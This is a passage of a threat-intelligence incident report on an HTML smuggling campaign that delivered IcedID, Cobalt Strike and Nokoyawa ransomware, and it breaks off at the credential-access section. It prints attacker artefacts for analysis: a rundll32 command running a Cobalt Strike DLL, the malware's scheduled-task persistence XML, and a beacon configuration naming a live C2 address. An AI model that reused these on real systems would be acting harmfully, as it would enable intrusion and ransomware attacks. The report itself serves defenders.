<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-20566" class="post-20566 post type-post status-publish format-standard hentry category-adfind category-attribution category-icedid category-nokoyawa category-ransomware entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
<a class="category-color-119" href="https://thedfirreport.com/category/attribution/">Attribution</a>
<a class="category-color-67" href="https://thedfirreport.com/category/icedid/">icedid</a>
<a class="category-color-111" href="https://thedfirreport.com/category/nokoyawa/">nokoyawa</a>
<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
</span>
</div>
<h1 class="entry-title">HTML Smuggling Leads to Domain Wide Ransomware</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2023-08-28T00:22:33+00:00">August 28, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>We&#8217;ve previously reported on a <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">Nokoyawa ransomware case</a> in which the initial access was via an Excel macro and IcedID malware. This case, which also ended in Nokoyawa Ransomware, involved the threat actor deploying the final ransomware only 12 hours after the initial compromise.</p>
<p>This threat actor delivered a password protected ZIP file via <a href="https://attack.mitre.org/techniques/T1027/006/" target="_blank" rel="noreferrer noopener">HTML smuggling</a> to organizations back in late October, early November 2022. Within the password protected ZIP file, there was an ISO file that deployed IcedID which led to the use of Cobalt Strike and ultimately <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.nokoyawa" target="_blank" rel="noreferrer noopener">Nokoyawa ransomware</a>. This intrusion also overlaps with the previous <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">Nokoyawa ransomware case</a>.</p>
<h2 id="services" class="wp-block-heading"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#services">Services</a></h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>Contact us today for a demo!</p>
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<p>In early November 2022, the intrusion began with the delivery of an HTML file. We assess with high confidence that the delivery was via email, as reported in other <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/html-smuggling-the-hidden-threat-in-your-inbox/" target="_blank" rel="noreferrer noopener">public reports</a>. This HTML file was using a technique known as HTML smuggling. This is one of the techniques threat actors have pivoted to since macro control defaults were updated by Microsoft. Just a month prior, this threat actor was observed using Excel macros in an extremely <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">similar campaign</a>.</p>
<p>Upon the user opening the HTML file, a fake Adobe page was presented and a ZIP file was downloaded. The Adobe lure includes a password for the ZIP as a way to protect the malicious contents from automated analysis. Inside the ZIP was an ISO file. Inside the ISO was the malware payload. The only visible file to the user was a LNK file masquerading as a document.</p>
<p>When the user clicked the LNK file, a series of commands were then executed. These included copying rundll32 and a malicious DLL from within the ISO to the host, before executing the malware. After loading the malicious DLL, a connection was made to IcedID command and control servers. The user meanwhile was served a legitimate image of a finance document.</p>
<p>When the malicious DLL was executed, persistence was also established via a scheduled task on the beachhead host. This task was set to run the IcedID malware every hour on the host. Initial discovery commands were ran seconds after reaching out to the command and control server. These commands have been seen in <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">previous reports</a> involving IcedID, including standard utilities like net, ipconfig, systeminfo, and nltest.</p>
<p>Around three hours after execution of the initial IcedID malware, a cmd process was spawned from IcedID. This new process began beaconing to a Cobalt Strike server. This Cobalt Strike server was previously observed in a prior <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">Nokoyawa report</a>. This process was then observed accessing LSASS, likely to access credentials. A quick check of domain admins using net was also observed.</p>
<p>Hands-on activity then paused for around three hours before the threat actor returned. Using the Cobalt Strike beacon, the threat actor looked up specific domain administrators using the net utility. Using one of those accounts, the threat actor initiated a RDP session to move laterally to a domain controller. Using this session, the threat actor copied over a Cobalt Strike beacon to the domain controller and executed it.</p>
<p>After that, the threat actor continued discovery actions by executing a batch file on the domain controller, which ran the usual battery of Active Directory discovery commands using AdFind. Upon completion, the results of the discovery commands were archived using 7-Zip. This was followed by the threat actor running a second batch file, which iterated through the network performing a nslookup for each host in the environment.</p>
<p>About five hours later, the threat actor returned to the domain controller and executed an encoded PowerShell command which was SessionGopher. SessionGopher is a tool that finds and decrypts saved session information for remote access tools. The threat actor then logged into additional hosts over RDP, including a backup server and a server with file shares. On the backup server, the threat actor opened the backup console. While on the file share, they used notepad to review a file on the host.</p>
<p>The threat actor returned to the domain controller and utilized netscan to perform a network scan. After the scan, both PsExec and WMIC were used to move files across systems in the network. Key files copied included k.exe and p.bat. These two files were the ransomware binary and a batch script that would be used to execute the ransomware.</p>
<p>Five minutes after transferring the files to hosts in the domain, the Nokoyawa ransomware binary was executed on a domain controller. At the same time, PsExec was used to execute the p.bat file starting the ransomware binary on the other hosts in the domain. The time to ransomware (TTR) was just over 12 hours from the initial infection.</p>
<h2>Attribution</h2>
<p>In this case we see two different threat actors; the distributor and the hands on keyboard actor. Proofpoint tracks this distributor as <a href="https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware" target="_blank" rel="noopener">TA551</a>. The hands on keyboard actor is tracked by Microsoft as Storm-0390 which is a &#8220;pen test&#8221; team managed by <a href="https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide" target="_blank" rel="noopener">Periwinkle Tempest</a> (formerly tracked as Storm-0193 and DEV-0193).</p>
<p>The ransomware affiliate is seen RDPing into the environment from server name WIN-5J00ETD85P5. This server name matches the one used by a threat actor from a <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noopener">prior Nokoyawa case</a>. We can see from internet scanning tools, this hostname is currently active on 78.128.113[.]154 hosted on AS209160 Miti2000 at 4vendeta.com in Bulgaria.</p>
<h2 class="wp-block-heading">Analysts</h2>
<p>Analysis and reporting completed by <a href="https://twitter.com/v3t0_" target="_blank" rel="noopener">@v3t0_</a>, <a href="https://twitter.com/AkuMehDFIR" target="_blank" rel="noopener">@AkuMehDFIR</a>, &amp; <a href="https://twitter.com/RoxpinTeddy" target="_blank" rel="noopener">@RoxpinTeddy</a></p>
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<p>For this campaign, thread hijacked emails were used to deliver the malicious HTML file. According to Proofpoint, this campaign was associated to a distribution group they track as TA551. Credits to Proofpoint for the below example.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-040.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-20680" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-040.png" alt width="1123" height="497" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-040.png 1123w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-040-300x133.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-040-1024x453.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-040-768x340.png 768w" sizes="(max-width: 1123px) 100vw, 1123px" /></a></p>
<p>After downloading and opening the HTML file, it downloaded a password protected ZIP file with a random name. The password to unzip the file was presented to the user.</p>
<p>The following image shows the HTML file opened in a browser.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-001.png"><img decoding="async" class="aligncenter size-full wp-image-20574" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-001.png" alt width="1616" height="819" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-001.png 1616w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-001-300x152.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-001-1024x519.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-001-768x389.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-001-1536x778.png 1536w" sizes="(max-width: 1616px) 100vw, 1616px" /></a></p>
<p>The ISO file from the zip, when mounted, had 1 visible LNK file (documents-9771) and 3 hidden files: demurest.cmd, pimpliest_kufic.png and templates544.png.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-002.png"><img decoding="async" class="aligncenter size-full wp-image-20575" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-002.png" alt width="951" height="571" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-002.png 951w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-002-300x180.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-002-768x461.png 768w" sizes="(max-width: 951px) 100vw, 951px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-003.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20576" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-003.png" alt width="619" height="128" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-003.png 619w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-003-300x62.png 300w" sizes="(max-width: 619px) 100vw, 619px" /></a></p>
<p>After execution, a legitimate image is opened to trick the user into thinking nothing is amiss.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-004-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20757" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-004-1.png" alt width="788" height="525" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-004-1.png 788w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-004-1-300x200.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-004-1-768x512.png 768w" sizes="(max-width: 788px) 100vw, 788px" /></a></p>
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<p>The ISO file contained a LNK file, with an icon of an Image, which prompted the user to click on it.When the user opened the LNK file, the batch script demurest.cmd was executed.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20578" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-005.png" alt width="355" height="363" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-005.png 355w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-005-293x300.png 293w" sizes="(max-width: 355px) 100vw, 355px" /></a></p>
<p>The batch script in the demurest.cmd file did the following:</p>
<ol class="wp-block-list">
<li>Opened pimpliest_kufic.png, which displayed an image.</li>
<li>The Windows utility xcopy was used to copy rundll32.exe to %temp%\entails.exe.</li>
<li>Created string &#8220;templates544.png&#8221; on the runtime and copied it with a random number with a format: RANDOM_NUM.RANDOM_NUM.</li>
<li>templates544.png was an IcedID DLL and was executed via entails.exe.</li>
</ol>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20673" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-038.png" alt width="655" height="624" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-038.png 655w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-038-300x286.png 300w" sizes="(max-width: 655px) 100vw, 655px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20674" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-039.png" alt width="1668" height="411" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-039.png 1668w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-039-300x74.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-039-1024x252.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-039-768x189.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-039-1536x378.png 1536w" sizes="(max-width: 1668px) 100vw, 1668px" /></a></p>
<p>We can see from memory (<a class="color-fg-default" href="https://github.com/ufrisk/MemProcFS" target="_blank" rel="noopener" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame">MemProcFS</a>), cmd executes entails.exe, which executes the IcedID dll by looking at the CommandLine. We can also see the call chain of cmd-&gt;entails.exe with a grand parent process of explorer.exe</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/123.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-20668 size-full" src="https://thedfirreport.com/wp-content/uploads/2023/08/123.png" alt width="674" height="307" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/123.png 674w, https://thedfirreport.com/wp-content/uploads/2023/08/123-300x137.png 300w" sizes="(max-width: 674px) 100vw, 674px" /></a></p>
<p>Around six hours into the intrusion, 1.dll (Cobalt Strike) was dropped on the beachhead host before being copied to a domain controller. After 1.dll was transferred to the domain controller, it was executed via rundll32.exe via following command:</p>
<pre>rundll32.exe 1.dll, DllRegisterServer</pre>
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<p>IcedID registered a scheduled task to gain persistence on the beachhead host, which ran every hour.</p>
<pre>&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;URI&gt;\{E5C1C7DB-E36E-5B16-8E3A-6226D7E53A67}&lt;/URI&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;TimeTrigger id="TimeTrigger"&gt;
      &lt;Repetition&gt;
        &lt;Interval&gt;PT1H&lt;/Interval&gt;
        &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;
      &lt;/Repetition&gt;
      &lt;StartBoundary&gt;2012-01-01T12:00:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;/TimeTrigger&gt;
    &lt;LogonTrigger id="LogonTrigger"&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;UserId&gt;REDACTED&lt;/UserId&gt;
    &lt;/LogonTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
      &lt;UserId&gt;REDACTED&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;rundll32.exe&lt;/Command&gt;
      &lt;Arguments&gt;"C:\Users\REDACTED\AppData\Local\REDACTED\Izjeubaw64.dll",#1 --oyxo="EdgeDecrease\license.dat"&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;
</pre>
<p>We can also see similar information in memory by reviewing most recently created scheduled tasks:</p>
<table width="424">
<tbody>
<tr>
<td width="64">TaskName</td>
<td width="64">TaskPath</td>
<td width="64">User</td>
<td width="64">CommandLine</td>
<td width="64">Parameters</td>
<td width="104">TimeReg</td>
</tr>
<tr>
<td>{E5C1C7DB-E36E-5B16-8E3A-6226D7E53A67}</td>
<td>\{E5C1C7DB-E36E-5B16-8E3A-6226D7E53A67}</td>
<td>Author</td>
<td>rundll32.exe</td>
<td>&#8220;C:\Users\REDACTED\AppData\Local\REDACTED\Izjeubaw64.dll&#8221;,#1 &#8211;oyxo=&#8221;EdgeDecrease\license.dat&#8221;</td>
<td>11/REDACTED/2022  11:35:10 AM</td>
</tr>
</tbody>
</table>
<h2 class="wp-block-heading"> </h2>
<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<p>The compromised user had local administrative privileges on their machine which allowed the threat actor to leverage tools requiring higher permissions.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20579" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-006.png" alt width="689" height="583" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-006.png 689w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-006-300x254.png 300w" sizes="(max-width: 689px) 100vw, 689px" /></a></p>
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<p>Looking at the contents of the malicious HTML file, we can pick out the HTML smuggling in the code. First, looking at the <code>&lt;script&gt;</code> tags we come to the following:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20580" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-007.png" alt width="2523" height="683" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-007.png 2523w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-007-300x81.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-007-1024x277.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-007-768x208.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-007-1536x416.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-007-2048x554.png 2048w" sizes="(max-width: 2523px) 100vw, 2523px" /></a></p>
<p>If we take that data blob, decode the contents with base64, and export that into a file, we can find the zipped ISO file hidden in the document:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20581" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-008.png" alt width="661" height="543" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-008.png 661w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-008-300x246.png 300w" sizes="(max-width: 661px) 100vw, 661px" /></a></p>
<p>The PK header indicates the data is the start of a <a href="https://en.wikipedia.org/wiki/ZIP_(file_format)" target="_blank" rel="noreferrer noopener">zip file</a>, and the following data reveals the contents to be an ISO file.</p>
<p>The initial access package from the threat actor used the Windows xcopy utility to rename rundll32.exe to entails.exe. This was likely to evade detection logic based around command line execution. Entails.exe, which loaded the IcedID DLL, was then observed injecting into a cmd.exe process on the beachhead host.</p>
<p>Below we can see the IcedID loader in memory in the entails.exe process:</p>
<table width="670">
<tbody>
<tr>
<td width="197">Process Name</td>
<td width="64">PID</td>
<td width="99">Type</td>
<td width="133">Address</td>
<td width="177">Description</td>
</tr>
<tr>
<td>entails.exe</td>
<td>4868</td>
<td>PE_INJECT</td>
<td>0000000180000000</td>
<td>Module:[loader_dll_64.dll]</td>
</tr>
</tbody>
</table>
<p>The entails.exe process first opened cmd.exe with the GrantedAccess of 0x1fffff, which maps to <strong>PROCESS_ALL_ACCESS</strong> rights, followed by a call to CreateRemoteThread, which was recorded by Sysmon Event ID 10 and 8 respectively as shown below:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20738" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-042.png" alt width="1226" height="160" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-042.png 1226w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-042-300x39.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-042-1024x134.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-042-768x100.png 768w" sizes="(max-width: 1226px) 100vw, 1226px" /></a></p>
<p>We can also see from memory, beacon.dll was injected into cmd.</p>
<table width="670">
<tbody>
<tr>
<td width="197">Process Name</td>
<td width="64">PID</td>
<td width="99">Type</td>
<td width="133">Address</td>
<td width="177">Description</td>
</tr>
<tr>
<td>cmd.exe</td>
<td>11636</td>
<td>PE_INJECT</td>
<td>0000000005380000</td>
<td>Module:[beacon.dll]</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Scanning the process memory of cmd.exe, the YARA rule <strong>win_cobalt_strike_auto</strong> from Malpedia fired. The following Cobalt Strike beacon configuration was then extracted from process memory:</p>
<pre>"BeaconType": "windows-beacon_https-reverse_https",
"Port": 443,
"Sleeptime": 60000,
"Maxgetsize": 1048576,
"Jitter": 0,
"MaxDns": 0,
"PublicKey": "30 81 9f 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 81 8d 00 30 81 89 02 81 81 00 a7 38 cd e7 5f 1f bb 1c 18 64 6c 37 7e 03 01 6b 16 2b 12 ba 72 bd f7 dc 36 b4 cd 2e 4e 9b ae 12 20 5a 95 c2 61 70 bf 90 81 05 ad 7f a4 bb cc fa 79 86 32 26 1b ed 98 70 f9 75 f2 07 94 e1 fe 49 95 23 d7 1f 08 a5 6c ae 03 15 bf de 3d 6c 8a 16 38 6b 03 b7 a6 55 1a a1 33 6d 50 32 5a 35 00 db 27 d7 8a d8 fd 13 b6 a7 3b 9f b7 c3 fb 4d 7a 08 8e 32 3f 07 61 86 56 ec d8 35 95 fa 5f 82 36 13 02 03 01 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
"c2_server": "5.8.18.242,/pixel.gif",
"UserAgent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
"PostURI": "/submit.php",
"Malleable_C2_Instructions2": "",
"HttpGetHeader": "Cookie",
"HttpPostHeader": "\n\u0026Content-Type: application/octet-streamid",
"SpawnTo": "",
"Pipename": "",
"KillDateYear": 0,
"KillDateMonth": 0,
"KillDateDay": 0,
"DNSIdle": "0.0.0.0",
"DNSSleep": 0,
"SSH_1": "",
"SSH_2": "",
"SSH_3": "",
"SSH_4": "",
"SSH_5": "",
"GetVerb": "GET",
"PostVerb": "POST",
"HttpPostChunk": 0,
"SpawnTox86": "%windir%\\syswow64\\rundll32.exe",
"SpawnTox64": "%windir%\\sysnative\\rundll32.exe",
"CryptoScheme": 0,
"Proxy": "",
"ProxyUsername": "",
"ProxyPassword": "",
"ProxyType": "IE settings",
"Deprecated": 0,
"LicenseId": 305419776,
"bStageCleanup": 0,
"bCFGCaution": 0,
"KillDate": 0,
"TextSectionEnd": 0,
"ObfuscateSectionsInfo": "",
"ProcessInjectStartRWX": "PAGE_EXECUTE_READWRITE",
"ProcessInjectUseRWX": "PAGE_EXECUTE_READWRITE",
"ProcessInjectMinAlloc": 0,
"ProcessInjectTransformx86": "",
"ProcessInjectTransformx64": "",
"UsesCookies": 1,
"ProcessInjectExecute": "",
"ProcessInjectAllocationMethod": 0,
"ProcessInjectStub": "b5 4a fe 01 ec 6a 75 ed f3 5e 1a 44 f8 bd 39 29",
"HostHeader": ""
</pre>
<p>The IP and port match what we see in memory:</p>
<table width="605">
<tbody>
<tr>
<td width="93">Offset</td>
<td width="64">Proto</td>
<td width="64">LocalAddr</td>
<td width="64">LocalPort</td>
<td width="64">ForeignAddr</td>
<td width="64">ForeignPort</td>
<td width="64">State</td>
<td width="64">PID</td>
<td width="64">Owner</td>
</tr>
<tr>
<td>0xa30e2a5f34d0</td>
<td>TCPv4</td>
<td>REDACTED</td>
<td>60597</td>
<td>5.8.18.242</td>
<td>443</td>
<td>CLOSED</td>
<td>11636</td>
<td>cmd.exe</td>
</tr>
</tbody>
</table>
<p>The injected cmd.exe, in turn, injected into rundll32.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20737" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-041.png" alt width="1072" height="543" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-041.png 1072w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-041-300x152.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-041-1024x519.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-041-768x389.png 768w" sizes="(max-width: 1072px) 100vw, 1072px" /></a></p>
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
